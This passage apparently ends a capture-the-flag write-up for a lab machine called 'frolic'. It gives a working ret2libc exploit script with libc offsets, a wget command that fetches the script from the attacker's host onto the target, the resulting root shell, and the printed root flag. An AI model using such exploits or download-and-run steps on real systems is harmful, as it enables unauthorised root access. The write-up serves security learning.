  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  1849: 000b07c8    24 FUNC    WEAK   DEFAULT   13 _Exit@@GLIBC_2.1.1
  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
```

### `"/bin/sh"` address

3. Final thing, we need a strings that contains `"/bin/sh"` (`0x15ba0b`)

```bash
$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep -i "/bin/sh"
 15ba0b /bin/sh
```

### Payload

`exploit.py` prepares our payload:

```python
#!/usr/bin/python
import struct

# 1. Create buffer
offset = 52
buffer = 'A' * offset
# 2. Little endian conversion
libc = 0xb7e19000
system = struct.pack('<I', libc + 0x0003ada0)
fn_exit = struct.pack('<I', libc + 0x0002e9d0)
binsh = struct.pack('<I', libc + 0x15ba0b)

payload = buffer + system + fn_exit + binsh

print(payload)
```

Download our script on the target machine:

```bash
$ wget http://10.10.14.7:8000/exploit.py
wget http://10.10.14.7:8000/exploit.py
--2020-12-30 01:49:06--  http://10.10.14.7:8000/exploit.py
Connecting to 10.10.14.7:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 330 [text/x-python]
Saving to: 'exploit.py'

exploit.py          100%[===================>]     330  --.-KB/s    in 0s      

2020-12-30 01:49:06 (28.6 MB/s) - 'exploit.py' saved [330/330]
```

## Root

Execute it, and then get root flag:

```bash
www-data@frolic:/home/ayush/.binary$ ./rop $(python /tmp/exploit.py)
./rop $(python /tmp/exploit.py)
# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cat /root/root.txt
cat /root/root.txt
85d3fdf03f969892538ba9a731826222
# 
```
___

## Useful links

- [CVE-2017-9101](https://cvedetails.com/cve/CVE-2017-9101/)
- [dCode - Ook! langage](https://www.dcode.fr/langage-ook)
- [dCode - Brainfuck langage](https://www.dcode.fr/langage-brainfuck)
- [base64decode.org](https://www.base64decode.org/)
- [hackndo - ret2libc](https://beta.hackndo.com/retour-a-la-libc/)